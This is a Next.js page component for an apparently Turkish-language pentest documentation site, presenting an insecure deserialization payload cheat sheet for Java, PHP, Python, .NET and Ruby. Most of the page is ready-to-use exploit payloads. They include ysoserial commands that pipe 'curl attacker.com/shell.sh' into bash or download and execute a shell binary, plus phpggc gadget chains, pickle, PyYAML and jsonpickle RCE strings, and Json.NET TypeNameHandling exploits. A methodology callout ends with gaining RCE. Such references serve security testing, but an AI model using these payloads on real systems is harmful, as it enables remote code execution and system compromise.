"use client"

import { motion } from "framer-motion"
import { Globe, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"
import { TableOfContents } from "@/components/docs/table-of-contents"

const tocItems = [
  { id: "java", title: "Java Deserialization", level: 2 },
  { id: "java-magic", title: "Java Magic Bytes", level: 2 },
  { id: "php", title: "PHP Deserialization", level: 2 },
  { id: "python", title: "Python Deserialization", level: 2 },
  { id: "dotnet", title: ".NET Deserialization", level: 2 },
  { id: "ruby", title: "Ruby Deserialization", level: 2 },
]

const fadeIn = {
  initial: { opacity: 0, y: 20 },
  animate: { opacity: 1, y: 0 },
  transition: { duration: 0.4 }
}

const stagger = {
  animate: {
    transition: {
      staggerChildren: 0.1
    }
  }
}

export default function DeserializationPage() {
  return (
    <div className="relative">
      <TableOfContents items={tocItems} />
      <motion.article
        className="prose prose-invert max-w-none"
        initial="initial"
        animate="animate"
        variants={stagger}
      >
      <motion.div variants={fadeIn} className="mb-8">
        <div className="flex items-center gap-2 text-blue-400 text-sm font-medium mb-4">
          <Globe className="w-4 h-4" />
          <span>Web Zafiyetleri</span>
        </div>
        <h1 className="text-4xl font-bold text-foreground mb-4">Insecure Deserialization</h1>
        <p className="text-lg text-muted-foreground leading-relaxed">
          Güvenilmeyen verilerin deserialize edilmesi sonucu oluşan zafiyet. Remote Code Execution (RCE),
          authentication bypass ve denial of service&apos;e yol açabilir.
        </p>
      </motion.div>

      <Callout type="warning" title="Kritik Seviye">
        Insecure deserialization genelde P1/Critical çünkü doğrudan RCE&apos;ye yol açar.
        Java, PHP, Python, .NET ve Ruby&apos;de yaygındır.
      </Callout>

      <motion.section variants={fadeIn} id="java" className="scroll-mt-20">
        <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
          <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-blue-500/10 text-blue-400 text-sm font-mono">01</span>
          Java Deserialization
        </h2>
        <p className="text-muted-foreground mb-4">
          Java ObjectInputStream kullanan uygulamalar hedef alınır. ysoserial aracı ile
          gadget chain&apos;ler oluşturulur.
        </p>
        <PayloadList
          title="ysoserial Payloads"
          initialShow={8}
          payloads={[
            { code: `java -jar ysoserial.jar CommonsCollections1 'id' | base64`, note: "Apache Commons Collections 3.1" },
            { code: `java -jar ysoserial.jar CommonsCollections5 'curl attacker.com/shell.sh|bash'`, note: "CC5 - reverse shell" },
            { code: `java -jar ysoserial.jar CommonsCollections6 'wget attacker.com/shell -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell'`, note: "CC6 chain" },
            { code: `java -jar ysoserial.jar CommonsCollections7 'ping -c 3 attacker.com'`, note: "CC7 - OOB detection" },
            { code: `java -jar ysoserial.jar CommonsCollections10 'id'`, note: "CC10 - newer versions" },
            { code: `java -jar ysoserial.jar CommonsCollections13 'id'`, note: "CC13 - latest chains" },
            { code: `java -jar ysoserial.jar Spring1 'touch /tmp/pwned'`, note: "Spring Framework gadget" },
            { code: `java -jar ysoserial.jar Hibernate1 'id'`, note: "Hibernate ORM gadget" },
            { code: `java -jar ysoserial.jar JBossInterceptors1 'id'`, note: "JBoss gadget" },
            { code: `java -jar ysoserial.jar Jdk7u21 'id'`, note: "JDK 7u21 native gadget" },
            { code: `java -jar ysoserial.jar URLDNS http://attacker.burpcollaborator.net`, note: "DNS lookup - detection only" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} id="java-magic" className="scroll-mt-20">
        <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
          <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-red-500/10 text-red-400 text-sm font-mono">02</span>
          Java Magic Bytes
        </h2>
        <Callout type="info" title="Tespit">
          Java serialized object&apos;ler &quot;ac ed 00 05&quot; (hex) veya &quot;rO0AB&quot; (base64) ile başlar.
          HTTP request/response&apos;larda bu pattern&apos;leri arayın.
        </Callout>
        <PayloadList
          title="Detection Patterns"
          initialShow={6}
          payloads={[
            { code: `ac ed 00 05`, note: "Java serialized object hex signature" },
            { code: `rO0AB`, note: "Base64 encoded Java object" },
            { code: `Content-Type: application/x-java-serialized-object`, note: "Java serialization content type" },
            { code: `H4sIAAAA`, note: "Base64 gzip Java object" },
            { code: `.class dosyalarında ObjectInputStream.readObject()`, note: "Source code review" },
            { code: `XMLDecoder, XStream, Kryo, Hessian`, note: "Alternatif serialization kütüphaneleri" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} id="php" className="scroll-mt-20">
        <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
          <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-yellow-500/10 text-yellow-400 text-sm font-mono">03</span>
          PHP Deserialization
        </h2>
        <p className="text-muted-foreground mb-4">
          PHP&apos;de unserialize() fonksiyonu ile magic method&apos;lar (__wakeup, __destruct, __toString)
          tetiklenerek RCE elde edilir.
        </p>
        <PayloadList
          title="PHP Object Injection"
          initialShow={8}
          payloads={[
            { code: `O:8:"stdClass":1:{s:4:"test";s:4:"data";}`, note: "Basic PHP serialized object" },
            { code: `O:14:"DatabaseExport":1:{s:8:"filename";s:11:"/etc/passwd";}`, note: "File read via deserialization" },
            { code: `O:4:"User":2:{s:4:"role";s:5:"admin";s:2:"id";i:1;}`, note: "Privilege escalation" },
            { code: `a:2:{i:0;s:4:"test";i:1;O:4:"Evil":1:{s:3:"cmd";s:2:"id";}}`, note: "Array with nested object" },
            { code: `O:+4:"User":1:{s:4:"role";s:5:"admin";}`, note: "+ bypass for class name filter" },
            { code: `O:4:"User":1:{S:4:"\\72ole";s:5:"admin";}`, note: "Hex encoded property name" },
            { code: `C:11:"ArrayObject":37:{x:i:0;a:1:{s:4:"role";s:5:"admin";};m:a:0:{}}`, note: "Custom serializable" },
            { code: `phpggc Laravel/RCE1 system id`, note: "PHPGGC - Laravel gadget chain" },
            { code: `phpggc Symfony/RCE4 exec 'id'`, note: "PHPGGC - Symfony gadget" },
            { code: `phpggc WordPress/RCE2 system id`, note: "PHPGGC - WordPress gadget" },
            { code: `phpggc Magento/SQLI1 'SELECT version()'`, note: "PHPGGC - Magento SQL injection" },
            { code: `phar://malicious.phar`, note: "Phar deserialization - file ops trigger unserialize" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} id="python" className="scroll-mt-20">
        <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
          <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-purple-500/10 text-purple-400 text-sm font-mono">04</span>
          Python Deserialization
        </h2>
        <PayloadList
          title="Pickle / PyYAML Payloads"
          initialShow={6}
          payloads={[
            { code: `import pickle, os; pickle.loads(b"cos\\nsystem\\n(S'id'\\ntR.")`, note: "Basic pickle RCE" },
            { code: `import yaml; yaml.load("!!python/object/apply:os.system ['id']")`, note: "PyYAML unsafe load" },
            { code: `import yaml; yaml.load("!!python/object/new:subprocess.check_output [['id']]")`, note: "PyYAML subprocess" },
            { code: `gASVIAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==`, note: "Base64 pickle payload" },
            { code: `\\x80\\x04\\x95...`, note: "Raw pickle bytes - protocol 4" },
            { code: `import jsonpickle; jsonpickle.decode('{"py/reduce": [{"py/function": "os.system"}, {"py/tuple": ["id"]}]}')`, note: "jsonpickle RCE" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} id="dotnet" className="scroll-mt-20">
        <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
          <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-orange-500/10 text-orange-400 text-sm font-mono">05</span>
          .NET Deserialization
        </h2>
        <PayloadList
          title=".NET Gadget Chains"
          initialShow={6}
          payloads={[
            { code: `ysoserial.net -g TypeConfuseDelegate -f ObjectStateFormatter -c "calc"`, note: "TypeConfuseDelegate chain" },
            { code: `ysoserial.net -g WindowsIdentity -f Json.Net -c "calc"`, note: "Json.NET deserialization" },
            { code: `ysoserial.net -g PSObject -f BinaryFormatter -c "calc"`, note: "BinaryFormatter chain" },
            { code: `ysoserial.net -g TextFormattingRunProperties -f BinaryFormatter -c "cmd /c ping attacker.com"`, note: "OOB detection" },
            { code: `ysoserial.net -g ActivitySurrogateSelector -f BinaryFormatter -c "cmd /c whoami"`, note: "Activity chain" },
            { code: `{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c calc"}}}`, note: "Json.NET TypeNameHandling exploit" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} id="ruby" className="scroll-mt-20">
        <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
          <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-green-500/10 text-green-400 text-sm font-mono">06</span>
          Ruby Deserialization
        </h2>
        <PayloadList
          title="Ruby Marshal Payloads"
          initialShow={4}
          payloads={[
            { code: `Marshal.dump(ERB.new("<%= system('id') %>"))`, note: "ERB template injection via Marshal" },
            { code: `Gem::Installer.new.spec.tap{|s| s.name="a"; s.version="0"; s.platform="ruby"; s.authors=["a"]; s.summary="a"; s.instance_variable_set(:@loaded_from,"|id")}`, note: "Gem::Installer gadget" },
            { code: `YAML.load("--- !ruby/object:Gem::Requirement\\nrequirements:\\n- !ruby/object:Gem::DependencyList\\n  specs:\\n  - !ruby/object:Gem::Source\\n    uri: |\\n      id")`, note: "YAML unsafe load" },
            { code: `\\x04\\x08...`, note: "Raw Marshal bytes" },
          ]}
        />
      </motion.section>

      <Callout type="tip" title="Test Metodolojisi">
        1. Serialized data tespit edin (cookies, hidden fields, API params){"\n"}
        2. Format belirleyin (Java, PHP, Python, .NET, Ruby){"\n"}
        3. Önce URLDNS/sleep ile zafiyet doğrulayın{"\n"}
        4. Gadget chain ile RCE elde edin{"\n"}
        5. ysoserial, phpggc, marshalsec araçlarını kullanın
      </Callout>

      <motion.div variants={fadeIn} className="mt-16 pt-8 border-t border-border/50">
        <div className="flex justify-between items-center">
          <Link
            href="/docs/web/xxe"
            className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors text-sm"
          >
            <ArrowLeft className="w-4 h-4" />
            XXE
          </Link>
          <Link
            href="/docs/web/file-upload"
            className="text-primary hover:text-primary/80 transition-colors text-sm flex items-center gap-2"
          >
            File Upload
            <ArrowRight className="w-4 h-4" />
          </Link>
        </div>
      </motion.div>
      </motion.article>
    </div>
  )
}
